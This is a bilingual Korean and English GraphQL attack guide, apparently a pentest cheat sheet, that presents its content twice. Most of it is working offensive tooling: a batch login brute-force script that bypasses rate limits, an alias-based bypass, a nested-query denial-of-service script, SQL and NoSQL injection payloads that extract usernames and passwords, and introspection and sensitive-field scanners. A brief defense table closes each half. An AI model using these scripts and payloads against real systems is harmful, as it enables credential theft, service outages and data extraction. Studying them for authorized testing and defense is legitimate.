> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# GraphQL 보안 — 인트로스펙션·배치 공격·권한 우회

## 1. GraphQL 공격 표면

GraphQL은 단일 엔드포인트(`/graphql`)에서 복잡한 쿼리를 수행하므로 REST API와 다른 공격 벡터를 제공한다.

| 공격 유형 | 설명 |
|-----------|------|
| 인트로스펙션 | 스키마 전체 덤프 — 필드명·타입·쿼리 자동 파악 |
| 배치 쿼리 | 단일 요청에 다수 쿼리 — Rate Limit 우회 |
| 깊이 중첩 쿼리 | 재귀 쿼리로 DoS 유발 |
| 필드 수준 인가 미흡 | 숨겨진 민감 필드 접근 |
| 인젝션 | 쿼리에 삽입되는 SQL/NoSQL 인젝션 |
| Alias 남용 | 동일 쿼리 다중 Alias로 Rate Limit 우회 |

---

## 2. 인트로스펙션 쿼리

```graphql
# 전체 스키마 덤프
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    types {
      ...FullType
    }
  }
}

fragment FullType on __Type {
  kind name description
  fields(includeDeprecated: true) {
    name description
    args { name type { ...TypeRef } }
    type { ...TypeRef }
    isDeprecated deprecationReason
  }
}

fragment TypeRef on __Type {
  kind name
  ofType { kind name ofType { kind name } }
}
```

```bash
# curl로 인트로스펙션 실행
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}' | jq .

# graphql-voyager용 스키마 추출
python3 -c "
import requests, json
q = open('introspection_query.graphql').read()
r = requests.post('https://target.com/graphql',
  json={'query': q},
  headers={'Authorization': 'Bearer TOKEN'})
print(json.dumps(r.json(), indent=2))
" > schema.json
```

---

## 3. 배치 쿼리 공격

```python
#!/usr/bin/env python3
"""GraphQL 배치 쿼리를 이용한 Rate Limit 우회 및 Brute Force."""

import argparse
import json
import httpx


def build_batch_login(usernames: list[str], password: str) -> list[dict]:
    return [
        {
            "query": f"""
            mutation {{
              login(username: "{u}", password: "{password}") {{
                token user {{ id email role }}
              }}
            }}
            """,
            "operationName": f"login_{i}",
        }
        for i, u in enumerate(usernames)
    ]


def batch_brute_force(
    url: str,
    usernames: list[str],
    passwords: list[str],
    batch_size: int = 50,
) -> list[dict]:
    found: list[dict] = []

    with httpx.Client(verify=False) as client:
        for password in passwords:
            for i in range(0, len(usernames), batch_size):
                chunk = usernames[i : i + batch_size]
                batch = build_batch_login(chunk, password)

                try:
                    resp = client.post(
                        url,
                        json=batch,
                        headers={"Content-Type": "application/json"},
                        timeout=30,
                    )
                    results = resp.json()

                    for j, result in enumerate(results):
                        if isinstance(result, dict):
                            data = result.get("data", {})
                            if data and data.get("login", {}).get("token"):
                                user = chunk[j]
                                print(f"[+] 로그인 성공: {user}:{password}")
                                found.append(
                                    {"username": user, "password": password, "data": data}
                                )
                except httpx.RequestError as e:
                    print(f"요청 오류: {e}")

    return found


def alias_rate_limit_bypass(url: str, query_template: str, values: list[str]) -> dict:
    """Alias를 이용해 단일 요청으로 다수 쿼리 실행."""
    aliases = "\n".join(
        f"q{i}: {query_template.format(val=v)}" for i, v in enumerate(values)
    )
    query = f"{{ {aliases} }}"

    with httpx.Client(verify=False) as client:
        resp = client.post(
            url,
            json={"query": query},
            headers={"Content-Type": "application/json"},
            timeout=30,
        )
        return resp.json()


def main() -> None:
    parser = argparse.ArgumentParser(description="GraphQL 보안 테스트")
    sub = parser.add_subparsers(dest="cmd", required=True)

    batch_p = sub.add_parser("batch-brute", help="배치 브루트포스")
    batch_p.add_argument("url")
    batch_p.add_argument("-U", "--userlist", required=True)
    batch_p.add_argument("-P", "--passlist", required=True)
    batch_p.add_argument("--batch-size", type=int, default=50)

    alias_p = sub.add_parser("alias", help="Alias Rate Limit 우회")
    alias_p.add_argument("url")
    alias_p.add_argument("--template", required=True, help="쿼리 템플릿 ({val} 사용)")
    alias_p.add_argument("--values", required=True, help="값 목록 (콤마 구분)")

    args = parser.parse_args()

    match args.cmd:
        case "batch-brute":
            usernames = Path(args.userlist).read_text().splitlines()
            passwords = Path(args.passlist).read_text().splitlines()
            results = batch_brute_force(args.url, usernames, passwords, args.batch_size)
            print(f"\n발견된 자격증명: {len(results)}개")

        case "alias":
            from pathlib import Path
            values = args.values.split(",")
            result = alias_rate_limit_bypass(args.url, args.template, values)
            print(json.dumps(result, indent=2, ensure_ascii=False))


if __name__ == "__main__":
    from pathlib import Path
    main()
```

---

## 4. 깊이 중첩 쿼리 (DoS)

```python
#!/usr/bin/env python3
"""GraphQL 쿼리 깊이 공격 — 재귀 중첩으로 서버 부하."""

import argparse
import httpx


def build_nested_query(field: str, depth: int) -> str:
    """지정 깊이의 재귀 중첩 쿼리 생성."""
    if depth == 0:
        return f"{{ {field} {{ id name }} }}"
    inner = build_nested_query(field, depth - 1)
    return f"{{ {field} {inner} }}"


def test_depth_dos(url: str, field: str, max_depth: int = 30) -> None:
    with httpx.Client(verify=False) as client:
        for depth in range(5, max_depth + 1, 5):
            query = build_nested_query(field, depth)
            try:
                resp = client.post(
                    url,
                    json={"query": query},
                    headers={"Content-Type": "application/json"},
                    timeout=30,
                )
                elapsed = resp.elapsed.total_seconds()
                print(f"깊이 {depth:3d}: HTTP {resp.status_code} | {elapsed:.2f}s")
                if elapsed > 10:
                    print(f"[!] 깊이 {depth}에서 응답 지연 — DoS 가능성")
                    break
            except httpx.TimeoutException:
                print(f"깊이 {depth:3d}: 타임아웃 — DoS 성공 가능")
                break


def main() -> None:
    parser = argparse.ArgumentParser(description="GraphQL 깊이 공격 테스트")
    parser.add_argument("url", help="GraphQL 엔드포인트")
    parser.add_argument("field", help="중첩할 필드명 (예: users, posts)")
    parser.add_argument("--max-depth", type=int, default=30)
    args = parser.parse_args()
    test_depth_dos(args.url, args.field, args.max_depth)


if __name__ == "__main__":
    main()
```

---

## 5. GraphQL 인젝션

### 5.1 NoSQL 인젝션 (MongoDB 백엔드)

```graphql
# 정상 쿼리
query { user(email: "admin@target.com") { id name role } }

# NoSQL 인젝션 — $gt 연산자 주입
query { user(email: {$gt: ""}) { id name role } }

# 정규식 인젝션
query { users(search: {$regex: ".*", $options: "i"}) { id email password } }
```

### 5.2 SQL 인젝션 (SQL 백엔드)

```graphql
# UNION 기반 인젝션
query {
  user(id: "1 UNION SELECT username,password,3 FROM users--") {
    id name email
  }
}

# 시간 기반 블라인드
query {
  user(id: "1; WAITFOR DELAY '0:0:5'--") { id }
}
```

---

## 6. 자동 스키마 분석 CLI

```python
#!/usr/bin/env python3
"""GraphQL 스키마 자동 분석 및 민감 필드 탐지."""

import argparse
import json
import re
from pathlib import Path
import httpx

SENSITIVE_PATTERNS = re.compile(
    r"password|passwd|secret|token|key|hash|salt|credit|ssn|pin|otp",
    re.IGNORECASE,
)

INTROSPECTION_QUERY = """
query {
  __schema {
    types {
      name
      fields { name type { name kind ofType { name } } }
    }
  }
}
"""


def fetch_schema(url: str, token: str | None = None) -> dict:
    headers: dict[str, str] = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    with httpx.Client(verify=False) as client:
        resp = client.post(url, json={"query": INTROSPECTION_QUERY}, headers=headers, timeout=30)
        return resp.json()


def analyze_schema(schema: dict) -> dict[str, list[str]]:
    sensitive: dict[str, list[str]] = {}
    types_ = schema.get("data", {}).get("__schema", {}).get("types", [])
    for t in types_:
        if not t.get("fields"):
            continue
        name = t["name"]
        for field in t["fields"]:
            fname = field.get("name", "")
            if SENSITIVE_PATTERNS.search(fname):
                sensitive.setdefault(name, []).append(fname)
    return sensitive


def main() -> None:
    parser = argparse.ArgumentParser(description="GraphQL 스키마 분석")
    parser.add_argument("url", help="GraphQL 엔드포인트")
    parser.add_argument("-t", "--token", help="인증 토큰")
    parser.add_argument("-o", "--output", type=Path, help="스키마 저장 경로")
    args = parser.parse_args()

    print(f"[*] 스키마 수집 중: {args.url}")
    schema = fetch_schema(args.url, args.token)

    if args.output:
        args.output.write_text(json.dumps(schema, indent=2, ensure_ascii=False))
        print(f"[+] 스키마 저장: {args.output}")

    sensitive = analyze_schema(schema)
    if sensitive:
        print("\n[!] 민감 필드 발견:")
        for type_name, fields in sensitive.items():
            print(f"  {type_name}: {', '.join(fields)}")
    else:
        print("[*] 민감 필드 미발견")


if __name__ == "__main__":
    main()
```

---

## 7. 방어 기법

| 방어 | 구현 |
|------|------|
| 인트로스펙션 비활성화 | 프로덕션에서 `introspection: false` |
| 쿼리 깊이 제한 | `graphql-depth-limit` — 최대 깊이 7 |
| 쿼리 복잡도 제한 | `graphql-cost-analysis` |
| 배치 쿼리 제한 | 단일 요청 최대 쿼리 수 제한 |
| 필드 수준 인가 | `graphql-shield` / Resolver 레벨 권한 체크 |
| Rate Limiting | 쿼리 복잡도 기반 Rate Limit |
| Persisted Queries | 허용된 쿼리 해시만 실행 |

---

<a name="english"></a>

# GraphQL Security — Introspection, Batch Attacks, and Authorization Bypass

## 1. GraphQL Attack Surface

GraphQL performs complex queries through a single endpoint (`/graphql`), providing different attack vectors than REST APIs.

| Attack Type | Description |
|-------------|-------------|
| Introspection | Full schema dump — automatic discovery of field names, types, and queries |
| Batch Queries | Multiple queries in a single request — Rate Limit bypass |
| Deeply Nested Queries | Recursive queries causing DoS |
| Insufficient Field-Level Authorization | Access to hidden sensitive fields |
| Injection | SQL/NoSQL injection inserted into queries |
| Alias Abuse | Multiple aliases of the same query to bypass Rate Limit |

---

## 2. Introspection Queries

```graphql
# Full schema dump
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    types {
      ...FullType
    }
  }
}

fragment FullType on __Type {
  kind name description
  fields(includeDeprecated: true) {
    name description
    args { name type { ...TypeRef } }
    type { ...TypeRef }
    isDeprecated deprecationReason
  }
}

fragment TypeRef on __Type {
  kind name
  ofType { kind name ofType { kind name } }
}
```

```bash
# Run introspection via curl
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}' | jq .

# Extract schema for graphql-voyager
python3 -c "
import requests, json
q = open('introspection_query.graphql').read()
r = requests.post('https://target.com/graphql',
  json={'query': q},
  headers={'Authorization': 'Bearer TOKEN'})
print(json.dumps(r.json(), indent=2))
" > schema.json
```

---

## 3. Batch Query Attack

```python
#!/usr/bin/env python3
"""Rate Limit bypass and Brute Force using GraphQL batch queries."""

import argparse
import json
import httpx


def build_batch_login(usernames: list[str], password: str) -> list[dict]:
    return [
        {
            "query": f"""
            mutation {{
              login(username: "{u}", password: "{password}") {{
                token user {{ id email role }}
              }}
            }}
            """,
            "operationName": f"login_{i}",
        }
        for i, u in enumerate(usernames)
    ]


def batch_brute_force(
    url: str,
    usernames: list[str],
    passwords: list[str],
    batch_size: int = 50,
) -> list[dict]:
    found: list[dict] = []

    with httpx.Client(verify=False) as client:
        for password in passwords:
            for i in range(0, len(usernames), batch_size):
                chunk = usernames[i : i + batch_size]
                batch = build_batch_login(chunk, password)

                try:
                    resp = client.post(
                        url,
                        json=batch,
                        headers={"Content-Type": "application/json"},
                        timeout=30,
                    )
                    results = resp.json()

                    for j, result in enumerate(results):
                        if isinstance(result, dict):
                            data = result.get("data", {})
                            if data and data.get("login", {}).get("token"):
                                user = chunk[j]
                                print(f"[+] Login successful: {user}:{password}")
                                found.append(
                                    {"username": user, "password": password, "data": data}
                                )
                except httpx.RequestError as e:
                    print(f"Request error: {e}")

    return found


def alias_rate_limit_bypass(url: str, query_template: str, values: list[str]) -> dict:
    """Execute multiple queries in a single request using Aliases."""
    aliases = "\n".join(
        f"q{i}: {query_template.format(val=v)}" for i, v in enumerate(values)
    )
    query = f"{{ {aliases} }}"

    with httpx.Client(verify=False) as client:
        resp = client.post(
            url,
            json={"query": query},
            headers={"Content-Type": "application/json"},
            timeout=30,
        )
        return resp.json()


def main() -> None:
    parser = argparse.ArgumentParser(description="GraphQL security testing")
    sub = parser.add_subparsers(dest="cmd", required=True)

    batch_p = sub.add_parser("batch-brute", help="Batch brute force")
    batch_p.add_argument("url")
    batch_p.add_argument("-U", "--userlist", required=True)
    batch_p.add_argument("-P", "--passlist", required=True)
    batch_p.add_argument("--batch-size", type=int, default=50)

    alias_p = sub.add_parser("alias", help="Alias Rate Limit bypass")
    alias_p.add_argument("url")
    alias_p.add_argument("--template", required=True, help="Query template (use {val})")
    alias_p.add_argument("--values", required=True, help="Value list (comma-separated)")

    args = parser.parse_args()

    match args.cmd:
        case "batch-brute":
            usernames = Path(args.userlist).read_text().splitlines()
            passwords = Path(args.passlist).read_text().splitlines()
            results = batch_brute_force(args.url, usernames, passwords, args.batch_size)
            print(f"\nCredentials found: {len(results)}")

        case "alias":
            from pathlib import Path
            values = args.values.split(",")
            result = alias_rate_limit_bypass(args.url, args.template, values)
            print(json.dumps(result, indent=2, ensure_ascii=False))


if __name__ == "__main__":
    from pathlib import Path
    main()
```

---

## 4. Deeply Nested Query (DoS)

```python
#!/usr/bin/env python3
"""GraphQL query depth attack — server load via recursive nesting."""

import argparse
import httpx


def build_nested_query(field: str, depth: int) -> str:
    """Build a recursively nested query at the specified depth."""
    if depth == 0:
        return f"{{ {field} {{ id name }} }}"
    inner = build_nested_query(field, depth - 1)
    return f"{{ {field} {inner} }}"


def test_depth_dos(url: str, field: str, max_depth: int = 30) -> None:
    with httpx.Client(verify=False) as client:
        for depth in range(5, max_depth + 1, 5):
            query = build_nested_query(field, depth)
            try:
                resp = client.post(
                    url,
                    json={"query": query},
                    headers={"Content-Type": "application/json"},
                    timeout=30,
                )
                elapsed = resp.elapsed.total_seconds()
                print(f"Depth {depth:3d}: HTTP {resp.status_code} | {elapsed:.2f}s")
                if elapsed > 10:
                    print(f"[!] Response delay at depth {depth} — possible DoS")
                    break
            except httpx.TimeoutException:
                print(f"Depth {depth:3d}: Timeout — DoS may be possible")
                break


def main() -> None:
    parser = argparse.ArgumentParser(description="GraphQL depth attack test")
    parser.add_argument("url", help="GraphQL endpoint")
    parser.add_argument("field", help="Field name to nest (e.g., users, posts)")
    parser.add_argument("--max-depth", type=int, default=30)
    args = parser.parse_args()
    test_depth_dos(args.url, args.field, args.max_depth)


if __name__ == "__main__":
    main()
```

---

## 5. GraphQL Injection

### 5.1 NoSQL Injection (MongoDB Backend)

```graphql
# Normal query
query { user(email: "admin@target.com") { id name role } }

# NoSQL injection — injecting $gt operator
query { user(email: {$gt: ""}) { id name role } }

# Regex injection
query { users(search: {$regex: ".*", $options: "i"}) { id email password } }
```

### 5.2 SQL Injection (SQL Backend)

```graphql
# UNION-based injection
query {
  user(id: "1 UNION SELECT username,password,3 FROM users--") {
    id name email
  }
}

# Time-based blind
query {
  user(id: "1; WAITFOR DELAY '0:0:5'--") { id }
}
```

---

## 6. Automated Schema Analysis CLI

```python
#!/usr/bin/env python3
"""Automated GraphQL schema analysis and sensitive field detection."""

import argparse
import json
import re
from pathlib import Path
import httpx

SENSITIVE_PATTERNS = re.compile(
    r"password|passwd|secret|token|key|hash|salt|credit|ssn|pin|otp",
    re.IGNORECASE,
)

INTROSPECTION_QUERY = """
query {
  __schema {
    types {
      name
      fields { name type { name kind ofType { name } } }
    }
  }
}
"""


def fetch_schema(url: str, token: str | None = None) -> dict:
    headers: dict[str, str] = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    with httpx.Client(verify=False) as client:
        resp = client.post(url, json={"query": INTROSPECTION_QUERY}, headers=headers, timeout=30)
        return resp.json()


def analyze_schema(schema: dict) -> dict[str, list[str]]:
    sensitive: dict[str, list[str]] = {}
    types_ = schema.get("data", {}).get("__schema", {}).get("types", [])
    for t in types_:
        if not t.get("fields"):
            continue
        name = t["name"]
        for field in t["fields"]:
            fname = field.get("name", "")
            if SENSITIVE_PATTERNS.search(fname):
                sensitive.setdefault(name, []).append(fname)
    return sensitive


def main() -> None:
    parser = argparse.ArgumentParser(description="GraphQL schema analysis")
    parser.add_argument("url", help="GraphQL endpoint")
    parser.add_argument("-t", "--token", help="Authentication token")
    parser.add_argument("-o", "--output", type=Path, help="Schema save path")
    args = parser.parse_args()

    print(f"[*] Fetching schema: {args.url}")
    schema = fetch_schema(args.url, args.token)

    if args.output:
        args.output.write_text(json.dumps(schema, indent=2, ensure_ascii=False))
        print(f"[+] Schema saved: {args.output}")

    sensitive = analyze_schema(schema)
    if sensitive:
        print("\n[!] Sensitive fields found:")
        for type_name, fields in sensitive.items():
            print(f"  {type_name}: {', '.join(fields)}")
    else:
        print("[*] No sensitive fields found")


if __name__ == "__main__":
    main()
```

---

## 7. Defense Techniques

| Defense | Implementation |
|---------|---------------|
| Disable Introspection | Set `introspection: false` in production |
| Query Depth Limit | `graphql-depth-limit` — maximum depth of 7 |
| Query Complexity Limit | `graphql-cost-analysis` |
| Batch Query Limit | Limit maximum queries per single request |
| Field-Level Authorization | `graphql-shield` / Resolver-level permission checks |
| Rate Limiting | Complexity-based Rate Limit |
| Persisted Queries | Only execute allowed query hashes |
